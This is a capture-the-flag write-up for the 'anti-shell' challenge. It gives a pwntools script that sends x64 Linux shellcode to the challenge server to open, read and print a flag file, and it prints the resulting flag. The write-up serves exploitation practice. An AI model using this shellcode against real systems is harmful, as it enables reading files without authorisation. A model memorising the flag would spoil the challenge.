# Challenge: anti-shell
## Description

> "Just open, write, read"

## Source
> anti_shell
## Solution
[x64 Linux Polymorphic read file shellcode](https://zerosum0x0.blogspot.com/2014/12/x64-linux-polymorphic-read-file.html)
```
from  pwn  import *

p = remote("128.199.219.160", 6031)
#p = process("./anti_shell")

shellcode = b"\x31\xf6\xf7\xe6\x52\x48\xb9\x66\x6C\x61\x67\x2E\x74\x78\x74\x51\x48\xb9\x65\x2F\x62\x6B\x73\x65\x63\x2F\x51\x48\xb9\x2F\x2F\x2F\x2F\x2F\x68\x6F\x6D\x51\x54\x5f\xb0\x02\x0f\x05\x50\x5f\x54\x5e\x52\x52\x52\x52\x58\x66\xba\x99\x09\x0f\x05\x5f\xff\xc7\x50\x5a\x58\xff\xc0\x0f\x05\x58\xb0\x3c\x0f\x05"
print(shellcode)

p.sendlineafter(b"\n", shellcode)
p.interactive()
```
> BKSEC{0p3n_r3@d_Wr1t3_she11c0d3_n0t_bAd_r1gHt}
